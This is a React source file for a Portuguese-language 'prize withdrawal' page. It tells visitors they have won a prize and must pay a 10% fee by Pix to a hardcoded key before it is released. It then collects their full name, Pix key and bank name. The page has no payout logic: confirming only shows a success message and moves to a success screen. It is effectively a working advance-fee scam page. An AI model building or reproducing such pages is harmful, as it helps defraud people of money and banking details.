"use client";

import React, { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { CheckCircle, Copy } from "lucide-react"; // Importando o ícone Copy
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";

const Withdrawal = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const totalPrize = (location.state as { totalPrize: number })?.totalPrize || 0;
  const withdrawalFee = totalPrize * 0.10; // 10% of the total prize
  const pixKeyForPayment = "fe2ae351-89ad-40b7-9fa4-755f21f15b63"; // Nova chave Pix

  const [fullName, setFullName] = useState("");
  const [bankPixKey, setBankPixKey] = useState("");
  const [bankName, setBankName] = useState("");
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);

  const handleConfirmPayment = () => {
    setPaymentConfirmed(true);
    toast.info("Agora preencha seus dados para receber o Pix.");
  };

  const handleCopyPixKey = async () => {
    try {
      await navigator.clipboard.writeText(pixKeyForPayment);
      toast.success("Chave Pix copiada para a área de transferência!");
    } catch (err) {
      console.error("Falha ao copiar a chave Pix:", err);
      toast.error("Não foi possível copiar a chave Pix. Por favor, copie manualmente.");
    }
  };

  const handleConfirmWithdrawal = () => {
    if (!fullName || !bankPixKey || !bankName) {
      toast.error("Por favor, preencha todos os campos para o saque.");
      return;
    }
    // Aqui você poderia adicionar a lógica para processar o saque
    toast.success("Informações de saque enviadas! Seu prêmio será processado após o pagamento da taxa.");
    navigate("/withdrawal-success"); // Navega para a nova página de sucesso
  };

  const isWithdrawalButtonDisabled = !fullName || !bankPixKey || !bankName;

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-dyad-blue to-dyad-blue-dark text-white p-4">
      <Card className="w-full max-w-md bg-white text-gray-900 shadow-xl rounded-lg">
        <CardHeader className="text-center">
          <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
          <CardTitle className="text-3xl font-bold mb-2">
            Saque Disponível!
          </CardTitle>
          <CardDescription className="text-lg text-gray-600">
            Parabéns pelo seu prêmio!
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6">
          <div className="mb-6 text-center">
            <p className="text-xl font-semibold mb-2">
              Prêmio Total:{" "}
              <span className="text-green-600 font-bold">
                R${totalPrize.toFixed(2).replace(".", ",")}
              </span>
            </p>
            <p className="text-lg text-gray-700">
              Taxa de Saque (10%):{" "}
              <span className="font-bold">
                R${withdrawalFee.toFixed(2).replace(".", ",")}
              </span>
            </p>
            <p className="text-lg text-gray-700 mt-2">
              Valor a Receber:{" "}
              <span className="font-bold text-blue-600">
                R${(totalPrize - withdrawalFee).toFixed(2).replace(".", ",")}
              </span>
            </p>
          </div>

          <div className="bg-dyad-yellow/20 p-4 rounded-md mb-6 border border-gray-200">
            <p className="text-md font-semibold mb-2">
              Para receber seu prêmio, pague a taxa via Pix:
            </p>
            <div className="flex items-center justify-center gap-2 mt-2 flex-wrap">
              <p className="text-lg font-bold text-center text-dyad-blue-dark break-all">
                Chave Pix: {pixKeyForPayment}
              </p>
              <Button
                onClick={handleCopyPixKey}
                variant="outline"
                size="sm"
                className="bg-white text-dyad-blue-dark hover:bg-gray-100 border-dyad-blue-dark"
              >
                <Copy className="h-4 w-4 mr-2" /> Copiar
              </Button>
            </div>
            <p className="text-sm text-gray-600 text-center mt-2">
              (Copie e cole no seu aplicativo bancário)
            </p>
          </div>

          {!paymentConfirmed && (
            <Button
              onClick={handleConfirmPayment}
              className="w-full mt-4 bg-green-600 hover:bg-green-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
            >
              Já efetuei o pagamento
            </Button>
          )}

          {paymentConfirmed && (
            <div className="space-y-4 mt-6 mb-6">
              <p className="text-center text-md text-gray-800 font-semibold">
                Preencha seus dados para receber o Pix:
              </p>
              <Input
                type="text"
                placeholder="Nome Completo"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="text-center text-lg py-6"
              />
              <Input
                type="text"
                placeholder="Sua Chave Pix Bancária"
                value={bankPixKey}
                onChange={(e) => setBankPixKey(e.target.value)}
                className="text-center text-lg py-6"
              />
              <Input
                type="text"
                placeholder="Nome do Seu Banco"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                className="text-center text-lg py-6"
              />
              <p className="text-center text-sm text-gray-600">
                As informações são necessárias para que o Pix seja efetuado na sua conta correta.
              </p>
              <p className="text-center text-md text-gray-800 mt-6">
                Após a confirmação do pagamento da taxa, seu prêmio será enviado via Pix em até 30 minutos.
              </p>
              <Button
                onClick={handleConfirmWithdrawal}
                disabled={isWithdrawalButtonDisabled}
                className="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white text-lg py-3 rounded-md shadow-md transition-all duration-300 transform hover:scale-105"
              >
                Confirmar Saque
              </Button>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default Withdrawal;